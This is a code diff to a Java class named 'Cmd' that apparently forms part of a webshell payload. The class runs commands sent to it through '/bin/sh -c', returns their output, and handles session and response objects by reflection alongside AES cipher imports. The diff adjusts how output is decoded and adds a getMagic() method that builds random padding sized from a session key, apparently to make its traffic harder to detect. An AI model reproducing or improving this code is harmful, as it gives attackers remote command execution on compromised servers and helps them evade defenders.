@@ -7,12 +7,14 @@ import java.nio.charset.Charset;
 import java.util.HashMap;
 import java.util.Iterator;
 import java.util.Map;
+import java.util.Random;
 import javax.crypto.Cipher;
 import javax.crypto.spec.SecretKeySpec;
 
 public class Cmd {
    public static String cmd;
    public static String path;
+   public static String whatever;
    private static String status = "success";
    private Object Request;
    private Object Response;
@@ -85,21 +87,18 @@ public class Cmd {
             p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
          }
 
-         BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream(), "GB2312"));
+         BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream(), osCharset));
 
          String disr;
          for(disr = br.readLine(); disr != null; disr = br.readLine()) {
             result = result + disr + "\n";
          }
 
-         br = new BufferedReader(new InputStreamReader(p.getErrorStream(), "GB2312"));
+         br = new BufferedReader(new InputStreamReader(p.getErrorStream(), osCharset));
 
          for(disr = br.readLine(); disr != null; disr = br.readLine()) {
-            status = "error";
             result = result + disr + "\n";
          }
-
-         result = new String(result.getBytes(osCharset));
       }
 
       return result;
@@ -167,5 +166,18 @@ public class Cmd {
       }
 
       this.Response.getClass().getMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
+   }
+
+   private byte[] getMagic() throws Exception {
+      String key = this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
+      int magicNum = Integer.parseInt(key.substring(0, 2), 16) % 16;
+      Random random = new Random();
+      byte[] buf = new byte[magicNum];
+
+      for(int i = 0; i < buf.length; ++i) {
+         buf[i] = (byte)random.nextInt(256);
+      }
+
+      return buf;
    }
 }
